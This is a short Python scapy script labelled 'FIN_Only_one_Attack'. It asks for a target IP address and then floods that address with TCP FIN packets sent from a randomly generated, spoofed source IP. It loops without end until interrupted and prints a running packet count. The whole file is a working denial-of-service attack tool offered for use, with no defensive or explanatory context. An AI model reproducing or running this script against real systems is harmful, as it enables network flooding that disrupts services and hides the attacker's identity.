import scapy.all as scapy

import os

import time

def FIN_One():

	clear = os.system('clear')

	print("**************************************")
	print("       FIN_Only_one_Attack")
	print("**************************************")
	print("please input your attack target's IP")
	target = input("[FIN_Only_one]#")

	src_ip = scapy.RandIP()

	attack_number = 0

	try:
		while True:
			
			packet = scapy.IP(src=src_ip,dst=target)/scapy.TCP(flags="F")
			scapy.send(packet,verbose=False)
			attack_number += 1
			print("[+]Sent "+str(attack_number)+" packets ")

	except KeyboardInterrupt:
		print("[-]Ctrl + C detected.....")

FIN_One()